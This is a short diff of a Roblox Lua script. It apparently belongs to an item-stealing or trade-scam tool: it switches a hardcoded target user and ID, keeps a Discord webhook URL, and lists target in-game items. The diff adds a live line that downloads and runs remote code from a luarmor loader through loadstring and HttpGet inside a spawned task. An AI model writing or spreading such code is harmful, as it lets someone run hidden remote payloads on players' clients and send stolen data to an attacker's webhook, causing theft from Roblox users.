@@ -1,5 +1,5 @@
-local TARGET_ID = 11689221192
-local TARGET_USER = "monstergoku666"
+local TARGET_ID = 11956516610
+local TARGET_USER = "duelgod_09"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1569404837987098674/70tXUNnk9EtLzvHXpwuZbueKfVm_G-D4_cnG8BOykZw5OB3LQuOm_TTQToaB2OcdddoW"
 
 local TargetBrainrots = {
@@ -341,7 +341,7 @@ local TargetGears = {
 }
 
 task.spawn(function()
-    https://api.luarmor.net/files/v4/loaders/28bc742e3a8f491e8155a5c4327fd4dd.lua
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/28bc742e3a8f491e8155a5c4327fd4dd.lua"))()
 
     task.wait(1)
 
